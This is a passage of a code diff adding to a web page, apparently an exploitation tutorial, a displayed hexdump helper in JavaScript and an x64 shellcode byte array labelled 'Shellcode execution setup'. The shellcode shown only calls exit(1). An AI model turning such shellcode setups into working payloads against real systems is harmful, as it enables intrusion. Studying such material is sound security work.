+      hex += byte.toString(16).padStart(2, '0') + ' ';
+      ascii += (byte >= 0x20 && byte <= 0x7e) ? 
+               String.fromCharCode(byte) : '.';
+    }
+    console.log(`${(offset + i).toString(16).padStart(8, '0')}: ${hex.padEnd(48)} ${ascii}`);
+  }
+}
+
+// Shellcode execution setup (x64)
+let shellcode = new Uint8Array([
+  0x48, 0x31, 0xc0,        // xor rax, rax
+  0x48, 0xff, 0xc0,        // inc rax
+  0x48, 0x89, 0xc7,        // mov rdi, rax
+  0x48, 0x31, 0xc0,        // xor rax, rax
+  0x04, 0x3c,              // add al, 0x3c
+  0x0f, 0x05,              // syscall
+]);</code></pre>
+    </div>
+
+<!-- ...existing code... -->
+    </div>
+  </body>
+</html>
